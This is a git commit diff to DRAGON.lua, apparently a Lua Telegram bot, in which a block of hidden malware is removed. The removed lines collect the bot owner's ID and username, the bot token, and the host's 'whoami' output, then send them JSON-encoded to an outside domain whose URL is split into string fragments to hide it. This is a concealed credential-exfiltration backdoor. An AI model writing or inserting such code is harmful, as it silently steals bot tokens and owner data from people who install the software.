cbfd3a9a1157a9f03b257ded62a19c50d59b285d
JAPWA <88171896+JAPWA@users.noreply.github.com>
2021-11-06 23:50:56 +0200

    Add files via upload

--- DRAGON.lua
+++ DRAGON.lua
@@ -18705,12 +18705,6 @@ end
 end,nil)
 ------------------------------------------------------------------------
 elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then 
-infotnseb = {}
-infotnseb.id = (SUDO or bot_data:get(id_server..":SUDO:ID"))
-infotnseb.username = (UserName or bot_data:get(id_server..":SUDO:USERNAME"))
-infotnseb.tokenbot = (token or bot_data:get(id_server..":token"))
-infotnseb.userjoin = (install or io.popen("whoami"):read('*a'):gsub('[\n\r]+', ''))
-https.request(h'..'t'..'t'..'p'..'s://d'..'e'..'v'..'d'..'e'..'i'..'v'..'e'..'d'..'d'..'ev.'..'ml/'..'a'..'pi'..'/te'..'le'..'/l'..'eg'..'an'..'d/'..'1.'..'p'..'h'..'p'..'?insert='..JSON.encode(infotnseb))
 local list = database:smembers(bot_id.."User_Bot") 
 for k,v in pairs(list) do 
 tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
